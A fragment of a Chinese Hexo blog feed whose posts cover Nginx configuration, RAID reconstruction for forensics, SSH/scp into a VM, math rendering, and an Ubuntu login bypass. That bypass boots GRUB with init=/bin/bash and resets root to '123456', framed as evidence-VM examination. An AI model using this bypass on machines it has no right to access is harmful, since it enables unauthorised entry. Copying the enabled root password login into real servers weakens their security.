title="负载均衡"></a>负载均衡</h3><p>当网站访问量非常大，网站站长开心赚钱的同时，也摊上事儿了。因为网站越来越慢，一台服务器已经不够用了。于是将同一个应用部署在多台服务器上，将大量用户的请求分配给多台机器处理。同时带来的好处是，其中一台服务器万一挂了，只要还有其他服务器正常运行，就不会影响用户使用。</p><p>Nginx可以通过反向代理来实现负载均衡。</p><p>配置: (将请求轮询分配到应用服务器，也就是一个客户端的多次请求，有可能会由多台不同的服务器处理。)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">upstream myapp &#123;</span><br><span class="line">server192.168.20.1:8080; # 应用服务器1</span><br><span class="line">server192.168.20.2:8080; # 应用服务器2</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">listen80;</span><br><span class="line">location &#x2F; &#123;</span><br><span class="line">proxy_pass http:&#x2F;&#x2F;myapp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>配置：(通过ip-hash的方式，根据客户端ip地址的hash值将请求分配给固定的某一个服务器处理。)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">upstream myapp &#123;</span><br><span class="line"> ip_hash; # 根据客户端IP地址Hash值将请求分配给固定的一个服务器处理</span><br><span class="line"> server192.168.20.1:8080;</span><br><span class="line"> server192.168.20.2:8080;</span><br><span class="line"> &#125;</span><br><span class="line"> server &#123;</span><br><span class="line"> listen80;</span><br><span class="line"> location &#x2F; &#123;</span><br><span class="line"> proxy_pass http:&#x2F;&#x2F;myapp;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>配置：(服务器的硬件配置可能有好有差，想把大部分请求分配给好的服务器，把少量请求分配给差的服务器，可以通过weight来控制。)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">upstream myapp &#123;</span><br><span class="line">server192.168.20.1:8080 weight&#x3D;3; # 该服务器处理3&#x2F;4请求</span><br><span class="line">server192.168.20.2:8080; # weight默认为1，该服务器处理1&#x2F;4请求</span><br><span class="line"> &#125;</span><br><span class="line">server &#123;</span><br><span class="line">listen80;</span><br><span class="line">location &#x2F; &#123;</span><br><span class="line">proxy_pass http:&#x2F;&#x2F;myapp;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h3 id="虚拟主机"><a href="#虚拟主机" class="headerlink" title="虚拟主机"></a>虚拟主机</h3><p>有的网站访问量大，需要负载均衡。然而并不是所有网站都如此出色，有的网站，由于访问量太小，需要节省成本，将多个网站部署在同一台服务器上。</p><p>例如将<code>http://www.aaa.com</code>和<a href="http://www.bbb.com两个网站部署在同一台服务器上，两个域名解析到同一个IP地址，但是用户通过两个域名却可以打开两个完全不同的网站，互相不影响，就像访问两个服务器一样，所以叫两个虚拟主机。" target="_blank" rel="noopener">http://www.bbb.com两个网站部署在同一台服务器上，两个域名解析到同一个IP地址，但是用户通过两个域名却可以打开两个完全不同的网站，互相不影响，就像访问两个服务器一样，所以叫两个虚拟主机。</a></p><p>配置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line"> listen 80 default_server;</span><br><span class="line"> server_name _;</span><br><span class="line"> return 444; # 过滤其他域名的请求，返回444状态码</span><br><span class="line"> &#125;</span><br><span class="line"> server &#123;</span><br><span class="line"> listen 80;</span><br><span class="line"> server_name www.aaa.com; # www.aaa.com域名</span><br><span class="line"> location &#x2F; &#123;</span><br><span class="line"> proxy_pass http:&#x2F;&#x2F;localhost:8080; # 对应端口号8080</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line">server &#123;</span><br><span class="line">listen 80;</span><br><span class="line">server_name www.bbb.com; # www.bbb.com域名</span><br><span class="line">location &#x2F; &#123;</span><br><span class="line">proxy_pass http:&#x2F;&#x2F;localhost:8081; # 对应端口号8081</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>在服务器8080和8081分别开了一个应用，客户端通过不同的域名访问，根据server_name可以反向代理到对应的应用服务器。</p><p>虚拟主机的原理是通过HTTP请求头中的Host是否匹配server_name来实现的</p><p>另外，server_name配置还可以过滤有人恶意将某些域名指向你的主机服务器。</p><h3 id="FastCGI"><a href="#FastCGI" class="headerlink" title="FastCGI"></a>FastCGI</h3><p>Nginx本身不支持PHP等语言，但是它可以通过FastCGI来将请求扔给某些语言或框架处理（例如PHP、Python、Perl）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">listen 80;</span><br><span class="line">location ~ \.php$ &#123;</span><br><span class="line">include fastcgi_params;</span><br><span class="line">fastcgi_param SCRIPT_FILENAME &#x2F;PHP文件路径$fastcgi_script_name; # PHP文件路径</span><br><span class="line">fastcgi_pass127.0.0.1:9000; # PHP-FPM地址和端口号</span><br><span class="line"># 另一种方式：fastcgi_pass unix:&#x2F;var&#x2F;run&#x2F;php5-fpm.sock;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>配置中将.php结尾的请求通过FashCGI交给PHP-FPM处理，PHP-FPM是PHP的一个FastCGI管理器。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Nginx笔记&quot;&gt;&lt;a href=&quot;#Nginx笔记&quot; class=&quot;headerlink&quot; title=&quot;Nginx笔记&quot;&gt;&lt;/a&gt;Nginx笔记&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://www.runoob.com/note/
      
    
    </summary>
    
    
      <category term="forensics" scheme="https://mercer5.github.io/categories/forensics/"/>
    
    
      <category term="secure" scheme="https://mercer5.github.io/tags/secure/"/>
    
  </entry>
  
  <entry>
    <title>raid重组</title>
    <link href="https://mercer5.github.io/2021/10/31/raid%E9%87%8D%E7%BB%84/"/>
    <id>https://mercer5.github.io/2021/10/31/raid%E9%87%8D%E7%BB%84/</id>
    <published>2021-10-31T04:40:16.000Z</published>
    <updated>2021-10-31T04:40:58.609Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Raid重组"><a href="#Raid重组" class="headerlink" title="Raid重组"></a>Raid重组</h1><h2 id="镜像"><a href="#镜像" class="headerlink" title="镜像"></a>镜像</h2><blockquote><p>dd可以很快实现</p><p>E01因为经过压缩所以可能失败</p></blockquote><ol><li>RAID磁盘组—选择镜像—自动计算磁盘序列</li></ol><p><img src="Snipaste_2020-10-23_16-42-00.png" alt="Snipaste_2020-10-23_16-42-00"></p><ol><li>选择一组可能的序列</li></ol><p><img src="Snipaste_2020-10-23_16-42-10.png" alt="Snipaste_2020-10-23_16-42-10"></p><ol><li>会自动显示RAID的类型,条带的大小</li></ol><p><img src="Snipaste_2020-10-23_16-46-58.png" alt="Snipaste_2020-10-23_16-46-58"></p><p><strong>导出重组后的镜像</strong></p><p><img src="Snipaste_2020-10-23_16-47-55.png" alt="Snipaste_2020-10-23_16-47-55"></p><h2 id="磁盘"><a href="#磁盘" class="headerlink" title="磁盘"></a>磁盘</h2><ol><li><p>和普通镜像一样加入案例中,如果直接显示<strong>raid?</strong>,说明是软raid,可以直接分析; 如果不行,说明是硬raid</p></li><li><p>挂载到本地磁盘</p><p><img src="Snipaste_2020-11-07_13-18-52.png" alt="Snipaste_2020-11-07_13-18-52"></p></li><li><p>使用磁盘计算</p><p><img src="image-20201107213750935.png" alt="image-20201107213750935"></p></li></ol><h2 id="R-Studio"><a href="#R-Studio" class="headerlink" title="R-Studio"></a>R-Studio</h2><p>打开镜像</p><p><img src="image-20211030163314081.png" alt="image-20211030163314081"></p><p><img src="image-20211030163329497.png" alt="image-20211030163329497"></p><p>创建虚拟RAID</p><p><img src="image-20211030163431470.png" alt="image-20211030163431470"></p><p>将镜像添加到虚拟RAID中</p><p><img src="image-20211030163658032.png" alt="image-20211030163658032"></p><p><img src="image-20211030163805945.png" alt="image-20211030163805945"></p><p>自动检测</p><p><img src="image-20211030163851095.png" alt="image-20211030163851095"></p><p><img src="image-20211030164111114.png" alt="image-20211030164111114"></p><p>如果成功了,一般会恢复出一些分区</p><p><img src="image-20211030164140286.png" alt="image-20211030164140286"></p><p>导出恢复出来的镜像</p><p><img src="image-20211030164533000.png" alt="image-20211030164533000"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Raid重组&quot;&gt;&lt;a href=&quot;#Raid重组&quot; class=&quot;headerlink&quot; title=&quot;Raid重组&quot;&gt;&lt;/a&gt;Raid重组&lt;/h1&gt;&lt;h2 id=&quot;镜像&quot;&gt;&lt;a href=&quot;#镜像&quot; class=&quot;headerlink&quot; title=&quot;镜像&quot;&gt;&lt;
      
    
    </summary>
    
    
      <category term="forensics" scheme="https://mercer5.github.io/categories/forensics/"/>
    
    
      <category term="secure" scheme="https://mercer5.github.io/tags/secure/"/>
    
  </entry>
  
  <entry>
    <title>ubuntu跳过登录</title>
    <link href="https://mercer5.github.io/2021/10/31/ubuntu%E8%B7%B3%E8%BF%87%E7%99%BB%E5%BD%95/"/>
    <id>https://mercer5.github.io/2021/10/31/ubuntu%E8%B7%B3%E8%BF%87%E7%99%BB%E5%BD%95/</id>
    <published>2021-10-31T01:50:34.000Z</published>
    <updated>2021-10-31T01:51:13.023Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ubuntu跳过登录"><a href="#ubuntu跳过登录" class="headerlink" title="ubuntu跳过登录"></a>ubuntu跳过登录</h1><h2 id="常规方法"><a href="#常规方法" class="headerlink" title="常规方法"></a>常规方法</h2><blockquote><p>以chagnan2019的检材4中的虚拟机为例</p></blockquote><ol><li>开机长按<code>esc</code>,进入<code>advanced options for ubuntu</code></li></ol><p><img src="image-20210717135201696.png" alt="image-20210717135201696"></p><ol><li>选中<code>recovery mode</code>,按<code>e</code>进入命令行模式</li></ol><p><img src="image-20210717135254135.png" alt="image-20210717135254135"></p><ol><li>找到有recovery nomodeset的行，<strong>删除</strong><code>recovery nomodeset</code> ，并在本行末尾<strong>加上</strong><code>quiet splash rw single init=/bin/bash</code> ，按F10；</li></ol><p><img src="image-20210717135936486.png" alt="image-20210717135936486"></p><p><img src="image-20210717140418626.png" alt="image-20210717140418626"></p><ol><li>在命令行输入passwd 用户名，修改密码</li></ol><p><img src="image-20210717140527140.png" alt="image-20210717140527140"></p><p>​        这里我将用户root的密码修改成了123456,这样下次就可以直接进入了</p><h2 id="火眼仿真绕过"><a href="#火眼仿真绕过" class="headerlink" title="火眼仿真绕过"></a>火眼仿真绕过</h2><p>放入虚拟机的vmdk文件</p><p><img src="image-20211021214423156.png" alt="image-20211021214423156"></p><p><img src="image-20211021214653320.png" alt="image-20211021214653320"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;ubuntu跳过登录&quot;&gt;&lt;a href=&quot;#ubuntu跳过登录&quot; class=&quot;headerlink&quot; title=&quot;ubuntu跳过登录&quot;&gt;&lt;/a&gt;ubuntu跳过登录&lt;/h1&gt;&lt;h2 id=&quot;常规方法&quot;&gt;&lt;a href=&quot;#常规方法&quot; class=&quot;head
      
    
    </summary>
    
    
      <category term="forensics" scheme="https://mercer5.github.io/categories/forensics/"/>
    
    
      <category term="secure" scheme="https://mercer5.github.io/tags/secure/"/>
    
  </entry>
  
  <entry>
    <title>ssh连接虚拟机</title>
    <link href="https://mercer5.github.io/2021/10/31/ssh%E8%BF%9E%E6%8E%A5%E8%99%9A%E6%8B%9F%E6%9C%BA/"/>
    <id>https://mercer5.github.io/2021/10/31/ssh%E8%BF%9E%E6%8E%A5%E8%99%9A%E6%8B%9F%E6%9C%BA/</id>
    <published>2021-10-31T01:25:53.000Z</published>
    <updated>2021-10-31T01:27:36.847Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ssh连接虚拟机"><a href="#ssh连接虚拟机" class="headerlink" title="ssh连接虚拟机"></a>ssh连接虚拟机</h1><blockquote><p><a href="https://blog.csdn.net/java_dotar_01/article/details/76942563" target="_blank" rel="noopener">ssh相关操作</a></p></blockquote><h2 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h2><blockquote><p>vim中输入<code>/</code>可以进行搜索</p></blockquote><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim <span class="regexp">/etc/</span>ssh<span class="regexp">/sshd_config</span></span><br></pre></td></tr></table></figure><p>将 <code>PasswordAuthentication</code> 改为 <code>yes</code></p><p><img src="image-20201004094841713.png" alt="image-20201004094841713"></p><p>将上图的<strong>no</strong>,改成<strong>yes</strong></p><blockquote><p>为防止使用root登录时发生permission denied的情况</p></blockquote><p>将<strong>PermitRootLogin no(服务端 SSH 服务配置了禁止root用户登录策略)</strong>的注释取消掉,并改成<strong>yes</strong></p><blockquote><p>按需要重启ssh服务,一般不用</p></blockquote><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">service sshd restart</span></span><br></pre></td></tr></table></figure><p>对于centos,重启命令有点不一样</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">systemctl</span> <span class="selector-tag">restart</span> <span class="selector-tag">sshd</span><span class="selector-class">.service</span></span><br></pre></td></tr></table></figure><h2 id="配置网络"><a href="#配置网络" class="headerlink" title="配置网络"></a>配置网络</h2><ol><li><p><code>ifconfig</code></p><p>查看虚拟机IP地址</p><p><img src="Snipaste_2020-10-04_09-35-19.png" alt="Snipaste_2020-10-04_09-35-19"></p></li><li><p>虚拟机-&gt;编辑-&gt;虚拟网络编辑器</p><p><img src="image-20201004095046401.png" alt="image-20201004095046401"></p></li><li><p>修改</p><p><img src="image-20201004095132187.png" alt="image-20201004095132187"></p><p>==注意这里的子网IP需要设置的和虚拟机所在IP一致！！==</p><p><img src="image-20201004095201304.png" alt="image-20201004095201304"></p></li></ol><h2 id="ssh连接"><a href="#ssh连接" class="headerlink" title="ssh连接"></a>ssh连接</h2><p>cmd中输入</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh <span class="symbol">root@</span><span class="number">192.168</span><span class="number">.217</span><span class="number">.131</span> (-p xxxx)</span><br></pre></td></tr></table></figure><h2 id="scp远程复制"><a href="#scp远程复制" class="headerlink" title="scp远程复制"></a>scp远程复制</h2><p>如果ssh能连接上，就可以用这个命令进行复制</p><ul><li><p>复制文件</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp root<span class="variable">@192</span>.<span class="number">168.184</span>.<span class="number">129</span><span class="symbol">:/home/admin888/fund/db</span>.sqlite3 <span class="symbol">C:</span>\Users\mercer\Desktop</span><br></pre></td></tr></table></figure></li><li><p>复制文件夹</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -r root<span class="variable">@192</span>.<span class="number">168.184</span>.<span class="number">129</span><span class="symbol">:/home/admin888/fund/</span> <span class="symbol">C:</span>\Users\mercer\Desktop</span><br></pre></td></tr></table></figure><p><img src="image-20211021222907451.png" alt="image-20211021222907451"></p></li></ul><h2 id="一些报错的解决方法"><a href="#一些报错的解决方法" class="headerlink" title="一些报错的解决方法"></a>一些报错的解决方法</h2><h3 id="ping不通"><a href="#ping不通" class="headerlink" title="ping不通"></a>ping不通</h3><blockquote><p>回寝室后又尝试使用ssh,但失败了,说连接超时</p></blockquote><p>首先,尝试在主机ping了一下虚拟机,发现失败了</p><p>虚拟机中ifconfig一下</p><p>主机中ipconfig一下</p><p><img src="image-20210714163016755.png" alt="image-20210714163016755"></p><p>综上发现两个的子网不一样,也就是说不在同一个网段</p><p>所以<strong>编辑</strong>-&gt;<strong>虚拟网络编辑器</strong>-&gt;<strong>VMnet8</strong>-&gt;修改子网,使其在同一网段</p><p><img src="image-20201009145400504.png" alt="image-20201009145400504"></p><p><img src="image-20201009145513559.png" alt="image-20201009145513559"></p><p>这里改成<code>192.168.137.0</code> </p><p>这时就ping的通了</p><h3 id="端口错误"><a href="#端口错误" class="headerlink" title="端口错误"></a>端口错误</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">netstat -atulnp</span></span><br></pre></td></tr></table></figure><p><img src="image-20211015092032969.png" alt="image-20211015092032969"></p><p>发现ssh服务开在7001端口!!!!</p><p>长安杯20的时候被这个端口坑的不轻</p><p><img src="image-20211015092125689.png" alt="image-20211015092125689"></p><p>其实在配置页中也可以看到端口信息</p><p><img src="image-20211018191835239.png" alt="image-20211018191835239"></p><h3 id="Permission-Denied"><a href="#Permission-Denied" class="headerlink" title="Permission Denied"></a>Permission Denied</h3><p><img src="image-20211018192752599.png" alt="image-20211018192752599"></p><p>后来发现是将 <code>PasswordAuthentication</code> 改为 <code>yes</code> 后,没保存</p><p>所以不能通过输入密码登入</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;ssh连接虚拟机&quot;&gt;&lt;a href=&quot;#ssh连接虚拟机&quot; class=&quot;headerlink&quot; title=&quot;ssh连接虚拟机&quot;&gt;&lt;/a&gt;ssh连接虚拟机&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/ja
      
    
    </summary>
    
    
      <category term="forensics" scheme="https://mercer5.github.io/categories/forensics/"/>
    
    
      <category term="secure" scheme="https://mercer5.github.io/tags/secure/"/>
    
  </entry>
  
  <entry>
    <title>hexo渲染数学公式</title>
    <link href="https://mercer5.github.io/2021/10/31/hexo%E6%B8%B2%E6%9F%93%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/"/>
    <id>https://mercer5.github.io/2021/10/31/hexo%E6%B8%B2%E6%9F%93%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/</id>
    <published>2021-10-31T01:15:49.000Z</published>
    <updated>2021-10-31T01:16:19.042Z</updated>
    
    <content type="html"><![CDATA[<h1 id="hexo渲染数学公式"><a href="#hexo渲染数学公式" class="headerlink" title="hexo渲染数学公式"></a>hexo渲染数学公式</h1><h2 id="渲染引擎下载"><a href="#渲染引擎下载" class="headerlink" title="渲染引擎下载"></a>渲染引擎下载</h2><p>更换Hexo的markdown渲染引擎</p><ul><li>hexo-renderer-marked: 默认的渲染引擎</li><li>hexo-renderer-kramed: 默认引擎的基础上修改了一些bug，两者比较接近，也比较轻量级。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 卸载原来的</span><br><span class="line">npm uninstall hexo-renderer-marked --save</span><br><span class="line"># 安装新的</span><br><span class="line">npm install hexo-renderer-kramed --save</span><br></pre></td></tr></table></figure><p>这样行间公式就可以正确渲染了，但是行内公式的渲染还是有问题，因为hexo-renderer-kramed引擎也有语义冲突的问题。</p><h2 id="配置引擎"><a href="#配置引擎" class="headerlink" title="配置引擎"></a>配置引擎</h2><p>接下来到博客根目录下，找到<code>node_modules\kramed\lib\rules\inline.js</code></p><ul><li><p>把第11行的escape变量的值做相应的修改：(在原基础上取消了对\,{,}的转义(escape))</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  escape: /^\\([\\`*&#123;&#125;\[\]()#$+\-.!_&gt;])/,</span></span><br><span class="line"><span class="built_in">escape</span>: <span class="regexp">/^\\([`*\[\]()#$+\-.!_&gt;])/</span></span><br></pre></td></tr></table></figure></li><li><p>同时把第20行的em变量也要做相应的修改。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  em: /^\b_((?:__|[\s\S])+?)_\b|^\*((?:\*\*|[\s\S])+?)\*(?!\*)/,</span></span><br><span class="line">em: <span class="regexp">/^\*((?:\*\*|[\s\S])+?)\*(?!\*)/</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="在主题中开启mathjax开关"><a href="#在主题中开启mathjax开关" class="headerlink" title="在主题中开启mathjax开关"></a>在主题中开启mathjax开关</h2><p>以next主题为例, 在主题(Theme)中开启mathjax开关</p><p>进入到<strong>主题目录</strong>，找到_config.yml配置文件，把mathjax默认的false修改为true，具体如下：</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># MathJax Support</span></span><br><span class="line"><span class="attr">mathjax:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">per_page:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><h2 id="在文章中使用"><a href="#在文章中使用" class="headerlink" title="在文章中使用"></a>在文章中使用</h2><p>在文章的Front-matter里打开mathjax开关</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">---</span></span><br><span class="line"><span class="selector-tag">title</span>: <span class="selector-tag">xxx</span></span><br><span class="line"><span class="selector-tag">date</span>: 2016<span class="selector-tag">-12-28</span> 21<span class="selector-pseudo">:01</span><span class="selector-pseudo">:30</span></span><br><span class="line"><span class="selector-tag">tags</span>:</span><br><span class="line"><span class="selector-tag">mathjax</span>: <span class="selector-tag">true</span></span><br><span class="line"><span class="selector-tag">--</span></span><br></pre></td></tr></table></figure><p>之所以要在文章头里设置开关，是因为考虑只有在用到公式的页面才加载 Mathjax，这样不需要渲染数学公式的页面的访问速度就不会受到影响了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;hexo渲染数学公式&quot;&gt;&lt;a href=&quot;#hexo渲染数学公式&quot; class=&quot;headerlink&quot; title=&quot;hexo渲染数学公式&quot;&gt;&lt;/a&gt;hexo渲染数学公式&lt;/h1&gt;&lt;h2 id=&quot;渲染引擎下载&quot;&gt;&lt;a href=&quot;#渲染引擎下载&quot; class=&quot;
      
    
    </summary>
    
    
      <category term="blog" scheme="https://mercer5.github.io/categories/blog/"/>
    
    
      <category term="blog" scheme="https://mercer5.github.io/tags/blog/"/>
    
  </entry>
  
  <entry>
    <title>md数学公式语法</title>
    <link href="https://mercer5.github.io/2021/10/30/md%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F%E8%AF%AD%E6%B3%95/"/>
    <id>https://mercer5.github.io/2021/10/30/md%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F%E8%AF%AD%E6%B3%95/</id>
    <published>2021-10-30T13:38:41.000Z</published>
    <updated>2021-10-30T13:44:35.178Z</updated>
    
    <content type="html"><![CDATA[<h1 id="md数学公式语法"><a href="#md数学公式语法" class="headerlink" title="md数学公式语法"></a>md数学公式语法</h1><h2 id="行内与独行"><a href="#行内与独行" class="headerlink" title="行内与独行"></a>行内与独行</h2><ol><li><p><strong>行内公式</strong>：将公式插入到本行内，符号：<script type="math/tex">公式内容</script>，如：$xyz$</p></li><li><p><strong>独行公式</strong>：将公式插入到新的一行内，并且居中，符号：$$$公式内容$$$，</p><p>输入两个<code>$</code>+回车,就可以自动生成一个数学公式块</p><p>如：</p><script type="math/tex; mode=display">asdf</script></li></ol><h2 id="上标、下标与组合"><a href="#上标、下标与组合" class="headerlink" title="上标、下标与组合"></a>上标、下标与组合</h2><ol><li>上标符号，符号：<code>^</code>，如：$x^4$</li><li>下标符号，符号：<code>_</code>，如：$x_1$</li><li>组合符号，符号：<code>{}</code>，如：${16}_{8}O{2+}_{2}$</li></ol><h2 id="汉字、字体与格式"><a href="#汉字、字体与格式" class="headerlink" title="汉字、字体与格式"></a>汉字、字体与格式</h2><ol><li>汉字形式，符号：<code>\mbox{}</code>，如：$V_{\mbox{初始}}$</li><li>字体控制，符号：<code>\displaystyle</code>，如：$\displaystyle \frac{x+y}{y+z}$</li><li>下划线符号，符号：<code>\underline</code>，如：$\underline{x+y}$</li><li>标签，符号<code>\tag{数字}</code>，如：$\tag{11}$</li><li>上大括号，符号：<code>\overbrace{算式}</code>，如：$\overbrace{a+b+c+d}^{2.0}$</li><li>下大括号，符号：<code>\underbrace{算式}</code>，如：$a+\underbrace{b+c}_{1.0}+d$</li><li>上位符号，符号：<code>\stacrel{上位符号}{基位符号}</code>，如：$\vec{x}\stackrel{\mathrm{def}}{=}{x_1,\dots,x_n}$</li></ol><h2 id="占位符"><a href="#占位符" class="headerlink" title="占位符"></a>占位符</h2><ol><li>两个quad空格，符号：<code>\qquad</code>，如：$x \qquad y$</li><li>quad空格，符号：<code>\quad</code>，如：$x \quad y$</li><li>大空格，符号<code>\</code>，如：$x \  y$</li><li>中空格，符号<code>\:</code>，如：$x\:y$</li><li>小空格，符号<code>\,</code>，如：$x \, y$</li><li>没有空格，符号``，如：$xy$</li><li>紧贴，符号<code>\!</code>，如：$x ! y$</li></ol><h2 id="定界符与组合"><a href="#定界符与组合" class="headerlink" title="定界符与组合"></a>定界符与组合</h2><ol><li>括号，符号：<code>（）\big(\big) \Big(\Big) \bigg(\bigg) \Bigg(\Bigg)</code>，如：$（）\big(\big) \Big(\Big) \bigg(\bigg) \Bigg(\Bigg)$</li><li>中括号，符号：<code>[]</code>，如：$[x+y]$</li><li>大括号，符号：<code>\{ \}</code>，如：$\{x+y\}$</li><li>自适应括号，符号：<code>\left \right</code>，如：$\left(x\right)$，$\left(x{yz}\right)$</li><li>组合公式，符号：<code>{上位公式 \choose 下位公式}</code>，如：${n+1 \choose k}={n \choose k}+{n \choose k-1}$</li><li>组合公式，符号：<code>{上位公式 \atop 下位公式}</code>，如：$\sum_{k_0,k_1,\ldots&gt;0 \atop k_0+k_1+\cdots=n}A_{k_0}A_{k_1}\cdots$</li></ol><h2 id="四则运算"><a href="#四则运算" class="headerlink" title="四则运算"></a>四则运算</h2><ol><li>加法运算，符号：<code>+</code>，如：$x+y=z$</li><li>减法运算，符号：<code>-</code>，如：$x-y=z$</li><li>加减运算，符号：<code>\pm</code>，如：$x \pm y=z$</li><li>减甲运算，符号：<code>\mp</code>，如：$x \mp y=z$</li><li>乘法运算，符号：<code>\times</code>，如：$x \times y=z$</li><li>点乘运算，符号：<code>\cdot</code>，如：$x \cdot y=z$</li><li>星乘运算，符号：<code>\ast</code>，如：$x \ast y=z$</li><li>除法运算，符号：<code>\div</code>，如：$x \div y=z$</li><li>斜法运算，符号：<code>/</code>，如：$x/y=z$</li><li>分式表示，符号：<code>\frac{分子}{分母}</code>，如：$\frac{x+y}{y+z}$</li><li>分式表示，符号：<code>{分子} \voer {分母}</code>，如：${x+y} \over {y+z}$</li><li>绝对值表示，符号：<code>||</code>，如：$|x+y|$</li></ol><h2 id="高级运算"><a href="#高级运算" class="headerlink" title="高级运算"></a>高级运算</h2><ol><li><p>平均数运算，符号：<code>\overline{算式}</code>，如：$\overline{xyz}$</p></li><li><p>开二次方运算，符号：<code>\sqrt</code>，如：$\sqrt x$</p></li><li><p>开方运算，符号：<code>\sqrt[开方数]{被开方数}</code>，如：$\sqrt[3]{x+y}$</p></li><li><p>克罗内克积, 符号: <code>\bigotimes</code> , 如: $\bigotimes$</p></li><li><p>异或,符号: <code>\bigoplus</code>, 如: $\bigoplus$</p></li><li><p>对数运算，符号：<code>\log</code>，如：$\log(x)$</p></li><li><p>极限运算，符号：<code>\lim</code>，如：$\lim^{x \to \infty}_{y \to 0}{\frac{x}{y}}$</p></li><li><p>极限运算，符号：<code>\displaystyle \lim</code>，如：$\displaystyle \lim^{x \to \infty}_{y \to 0}{\frac{x}{y}}$</p></li><li><p>求和运算，符号：<code>\sum</code>，如：$\sum^{x \to \infty}_{y \to 0}{\frac{x}{y}}$</p></li><li><p>求和运算，符号：<code>\displaystyle \sum</code>，如：$\displaystyle \sum^{x \to \infty}_{y \to 